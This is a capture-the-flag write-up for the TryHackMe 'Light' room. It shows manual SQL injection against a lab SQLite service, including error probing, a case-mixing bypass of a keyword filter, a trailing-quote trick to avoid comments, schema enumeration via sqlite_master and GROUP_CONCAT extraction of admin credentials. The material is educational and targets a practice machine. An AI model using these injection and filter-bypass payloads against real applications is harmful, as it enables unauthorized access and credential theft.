# TryHackMe: Light

**Platform:** TryHackMe

**Room:** [Light](https://tryhackme.com/room/lightroom)

**Difficulty:** Easy

**Focus:** Manual SQL injection against a custom SQLite database service.

**⚠️Disclaimer:** This writeup contains step by step solutions. Flags and answers have been redacted to encourage active learning.

---

## 📑 Table of Contents

- [Setup & Connection](#setup--connection)
- [Initial Access](#initial-access)
- [Testing for SQL Injection](#testing-for-sql-injection)
- [Bypassing the Word Filter](#bypassing-the-word-filter)
- [Identifying the Database Type](#identifying-the-database-type)
- [Enumerating Tables](#enumerating-tables)
- [Extracting Credentials](#extracting-credentials)
- [Answer 1: Admin Username](#answer-1-admin-username)
- [Answer 2: Admin Password](#answer-2-admin-password)
- [Answer 3: The Flag](#answer-3-the-flag)
- [Conclusion](#conclusion)

---

## Setup & Connection

First, connect to the TryHackMe network using OpenVPN, then start the lab machine.

```bash
sudo openvpn <your_configuration_file>.ovpn
```

The room description gives us direct info about the target, so we can skip `nmap`:
- The application runs on **port 1337**
- We connect using `nc MACHINE_IP 1337`
- We have a starting username: `smokey`

Note: Allow the service 2 to 3 minutes to fully start before connecting.

---

## Initial Access

Let's connect to the service:

```bash
nc 10.129.186.215 1337
```
```text
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: 
```

We get a password for `smokey`. Let's try SSHing in with these credentials:

```bash
ssh smokey@10.129.186.215
```
```text
The authenticity of host '10.129.186.215 (10.129.186.215)' can't be established.
ED25519 key fingerprint is: SHA256:jyi/cNlbkGVlQP6sUEHZO/+y3sggtSW9MoS0EjpTwcQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.186.215' (ED25519) to the list of known hosts.
smokey@10.129.186.215's password: 
Permission denied, please try again.
```

SSH doesn't work. The password is only valid within the Light database application. Let's look for a SQL injection vulnerability.

---

## Testing for SQL Injection

First, let's see what happens when we enter a username that doesn't exist:

```text
Please enter your username: user
Username not found.
```

Now let's try a single quote to test for injection:

```text
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

We get an SQL error! This tells us:
1. The input is being concatenated directly into a SQL query
2. The query has `LIMIT 30` appended to it
3. The backend is likely SQLite (based on the error format)

For reference, I'm using payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), specifically the [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md) page initially.

Let's try a basic OR injection:

```text
Please enter your username: ' OR '1
Password: tF8tj2o94WE4LKC
```

We get a different password! The `' OR '1` makes the query return all rows, so we're getting the password from a different user. This confirms the injection works.

---

## Bypassing the Word Filter

Let's try a UNION SELECT to extract more data:

```text
Please enter your username: ' UNION SELECT NULL
Ahh there is a word in there I don't like :(
```

There's a word filter! Let's figure out which word is banned by trying different capitalizations:

```text
Please enter your username:  ' Union SELECT NULL
Ahh there is a word in there I don't like :(

Please enter your username:  ' UNION Select NULL
Ahh there is a word in there I don't like :(

Please enter your username:  ' Union Select NULL
Error: unrecognized token: "' LIMIT 30"
```

Interesting! `UNION` in all caps is banned, and `SELECT` in all caps is banned, but mixed case (`Union Select`) works! The filter is case sensitive.

Let's try adding a comment to handle the trailing `LIMIT 30`:

```text
Please enter your username: ' Union Select NULL;--
For strange reasons I can't explain, any input containing /*, -- or %0b is not allowed :)
```

Comments are banned too! But we can work around this by closing the query with a string quote instead:

```text
Please enter your username: ' Union Select NULL '
Password: None
```

It works! The trailing `'` makes `LIMIT 30'` a string, which doesn't break the query. We get `None` because we selected NULL.

---

## Identifying the Database Type

Let's try extracting database schema information. First, let's try MySQL syntax:

```text
Please enter your username: smokey' UnION SeLECT 1,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata '
Error: no such table: information_schema.schemata
```

`information_schema.schemata` doesn't exist, so this isn't MySQL. Let's switch to the [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) page.

In SQLite, the table `sqlite_master` holds the database schema. Let's query it:

```text
Please enter your username: ' Union Select sql FROM sqlite_master '
```
```text
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

We get the schema for the `admintable`! Now we know the structure: it has `id`, `username`, and `password` columns.

---

## Enumerating Tables

Let's get a list of all tables in the database:

```text
Please enter your username: ' Union SeLECT group_concat(tbl_name) FROM sqlite_master '
```
```text
Password: usertable,admintable
```

Two tables: `usertable` and `admintable`. Let's get the full schema for both:

```text
Please enter your username: ' Union SeLECT group_concat(sql, '|') FROM sqlite_master '
```
```text
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)|CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

Both tables have the same structure: `id`, `username`, `password`.

---

## Extracting Credentials

Now let's extract the admin credentials in one go using `GROUP_CONCAT` with a separator. We combine the username and password with a colon, and use `CHAR(10)` (newline) as the separator between rows:

```text
Please enter your username:  smokey' Union SeLECT GROUP_CONCAT(username || ':' || password , CHAR(10)) FROM admintable '   
Password: [REDACTED]
flag: THM{...}
```

The server dumps the admin credentials formatted as `username:password`, and the flag is printed right after! We didn't even need to log in anywhere. The SQL injection payload itself revealed everything.

---

## Answer 1: Admin Username

**What is the admin username?**
> ✅ **Answer:** `[REDACTED]`

*(Answer redacted. Walk the SQL injection chain yourself to retrieve it!)*

---

## Answer 2: Admin Password

**What is the password to the username mentioned in question 1?**
> ✅ **Answer:** `[REDACTED]`

*(Answer redacted. Walk the SQL injection chain yourself to retrieve it!)*

---

## Answer 3: The Flag

The flag was returned in the same SQL injection response above, right after the credentials dump.

**What is the flag?**
> ✅ **Answer:** `THM{...}`

*(Flag redacted. Walk the SQL injection chain yourself to retrieve it!)*

---

## Conclusion

The Light room is a great introduction to manual SQL injection:

1. **Service enumeration** via `nc` instead of `nmap` (info was given in the room description)
2. **Error based detection** by injecting a single quote
3. **Case sensitive word filter bypass** using mixed case (`Union Select` instead of `UNION SELECT`)
4. **Comment bypass** by closing the query with a trailing string quote instead of using `--` or `/*`
5. **Database type identification** by testing MySQL syntax first, then switching to SQLite
6. **Schema enumeration** via `sqlite_master`
7. **Data extraction** from the `admintable` using `GROUP_CONCAT`, which revealed both the credentials and the flag in a single response

This room really emphasizes the importance of understanding SQL injection manually rather than just relying on tools like `sqlmap`, since the word filter would have made automated tools much harder to use.

Big thanks to [**hadrian3689**](https://tryhackme.com/p/hadrian3689) and TryHackMe for creating this room!

**Useful Resources:**
- [PayloadsAllTheThings - SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
- [PayloadsAllTheThings - MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
- [SQLite - sqlite_master table](https://www.sqlite.org/sqlitemaster.html)

